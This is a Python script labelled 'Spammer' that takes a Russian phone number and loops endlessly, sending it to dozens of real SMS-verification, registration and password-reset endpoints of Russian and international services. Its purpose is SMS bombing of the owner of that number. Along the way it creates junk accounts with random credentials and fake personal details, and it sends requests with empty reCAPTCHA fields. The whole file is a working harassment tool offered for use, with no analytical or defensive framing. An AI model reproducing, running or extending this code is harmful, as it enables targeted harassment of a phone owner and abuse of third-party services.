#!/usr/bin/python3
# Spammer
# Author: milkpro
import requests, random, datetime, sys, time, argparse, os
from colorama import Fore, Style
os.system('cls' if os.name=='nt' else 'clear')
logo = Fore.GREEN+"┏━┓\n┃━╋━┳━┓┏━━┳━━┳━┳┳┓\n┣━┃╋┃╋┗┫┃┃┃┃┃┃┻┫┏┛\n┗━┫┏┻━━┻┻┻┻┻┻┻━┻┛"+Style.RESET_ALL+" by milkpro\n"+Fore.GREEN+"  ┗┛"+Style.RESET_ALL
print(logo)
_phone = input(Fore.BLUE+"(79XXXXXXXXX)>> "+Style.RESET_ALL)
if _phone[0] == '+':
  _phone = _phone[1:]
if _phone[0] == '8':
  _phone = '7'+_phone[1:]
if _phone[0] == '9':
  _phone = '7'+_phone
_name = ''
for x in range(12):
  _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
  password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
  username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
iteration = 0
os.system('cls' if os.name=='nt' else 'clear')
print(logo)
print(Fore.WHITE+"Телефон: " +Fore.BLUE+ _phone)
print(Fore.WHITE+"Спамер запущен.")
while True:
  _email = _name+f'{iteration}'+'@gmail.com'
  email = _email
  try:
    requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
  except:
    pass
  try:
    requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
  except:
    pass
  try:
    requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
  except:
    pass
  try:
    requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
  except:
    pass
  try:
    requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
  except:
    pass
  try:
    requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
  except:
    pass
  try:
    requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
  except:
    pass
  try:
    requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
  except:
    pass
  try:
    requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
  except:
    pass
  try:
    requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
  except:
    pass
  try:
    requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
  except:
    pass
  try:
    requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
  except:
    pass
  try:
    requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
  except:
    pass
  try:
    requests.get('https://findclone.ru/register?phone=+'+_phone, params={'phone': '+'+_phone})
  except:
    pass
  try:
    requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
  except:
    pass
  try:
    requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" +_phone})
  except:
    pass
  try:
    requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
  except:
    pass
  try:
    requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
  except:
    pass
  try:
    requests.post('https://www.instagram.com/accounts/account_recovery_send_ajax/', data={'email_or_username': _phone, 'recaptcha_challenge_field':''})
  except:
    pass
  try:
    requests.post('https://vladikavkaz.edostav.ru/site/CheckAuthLogin', data={"phone_or_email":_phone}, headers={"Host": "vladikavkaz.edostav.ru", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Content-Length": "26"})
  except:
    pass
  try:
    requests.post('https://youla.ru/web-api/auth/request_code', data={"phone":_phone})
  except:
    pass 
  try:
    requests.post("https://fix-price.ru/ajax/register_phone_code.php",data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
  except:
    pass
  try:
    requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": _phone})
  except:
    pass
  try:
    requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
  except:
    pass
  try:
    requests.post("https://account.my.games/signup_send_sms/", data={"phone": _phone})
  except:
    pass
  try:
    requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": _phone, "otpId": 0})
  except:
    pass
  try:
    requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+" +_phone, "action": "confirm_mobile"})
  except:
    pass
  try:
    requests.post("https://dostavista.ru/backend/send-verification-sms", data={"phone": _phone9dostavista})
  except:
    pass
  try:
    requests.post("https://eda.yandex/api/v1/user/request_authentication_code",json={"phone_number": "+" + _phone})
  except:
    pass
  try:
    requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone})
  except:
    pass
  try:
    requests.post("https://msk.tele2.ru/api/validation/number/" +_phone,json={"sender": "Tele2"})
  except:
    pass
  try:
    requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
  except:
    pass
  try:
    requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
  except:
    pass
  try:
    requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
  except:
    pass
  try:
    requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
  except:
    pass
  try:
    requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
  except:
    pass
  try:
    requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
  except:
    pass
  try:
    requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
  except:
    pass
  try:
    requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": ""})
  except:
    pass
  try:
    requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
  except:
    pass
  try:
    requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
  except:
    pass
  try:
    requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
  except:
    pass
  try:
    requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
  except:
    pass
  try:
    requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
  except:
    pass
  try:
    requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
  except:
    pass
  try:
    requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
  except:
    pass
  try:
    requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
  except:
    pass
  try:
    requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
  except:
    pass
  try:
    requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
  except:
    pass
  try:
    requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
  except:
    pass
  try:
    requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
  except:
    pass
  try:
    requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
  except:
    pass
  try:
    requests.post("https://alfalife.cc/auth.php", data={"phone": _phone})
  except:
    pass
  try:
    requests.post("https://app.benzuber.ru/login", data={"phone": "+" + _phone})
  except:
    pass
  try:
    requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone","variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n",})
  except:
    pass
  try:
    requests.post("https://app.cloudloyalty.ru/demo/send-code",json={"country": 2,"phone": _phone,"roistatVisit": "47637","experiments": {"new_header_title": "1"},})
  except:
    pass
  try:
    requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3,})
  except:
    pass
  try:
    requests.post("https://www.finam.ru/api/smslocker/sendcode",data={"phone": "+" + _phone})
  except:
    pass
  try:
    requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": _phone, "platform": "PISWeb"})
  except:
    pass
  try:
    requests.post("https://icq.com/smscode/login/ru",data={"msisdn": _phone})
  except:
    pass
  try:
    requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",json={"phone": "+" + _phone})
  except:
    pass
  try:
    requests.post("https://www.ollis.ru/gql",json={"query": 'mutation { phone(number:"%s", locale:ru) { token error { code message } } }'% _phone})
  except:
    pass
  try:
    requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
  except:
    pass
  try:
    requests.post("https://app.redmondeda.ru/api/v1/app/sendverificationcode",headers={"token": "."},data={"phone": _phone})
  except:
    pass
  try:
    requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",json={"phone": _phone})
  except:
    pass
  try:
    requests.post("https://app.sberfood.ru/api/mobile/v3/auth/sendSms",json={"userPhone": "+" + _phone},headers={"AppKey": "WebApp-3a2605b0cf2a4c9d938752a84b7e97b6"})
  except:
    pass
  try:
    requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": "+" +_phone, "resend": 0})
  except:
    pass
  try:
    requests.get("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper",params={"oper": 9, "callmode": 1, "phone": "+" +_phone})
  except:
    pass
  try:
    requests.get("https://www.sportmaster.ru/",params={"module": "users", "action": "SendSMSReg", "phone": _phone})
  except:
    pass
  try:
    requests.post("https://api.tinkoff.ru/v1/sign_up", data={"phone": "+" +_phone})
  except:
    pass
  try:
    requests.post("https://api.chef.yandex/api/v2/auth/sms", json={"phone": _phone})
  except:
    pass
  try:
    requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
  except:
    pass
  try:
    requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
  except:
    pass
  try:
    requests.post('https://plink.tech/register/',json={"phone": _phone})
  except:
    pass
  iteration += 1
  print(('{} круг пройден.').format(iteration))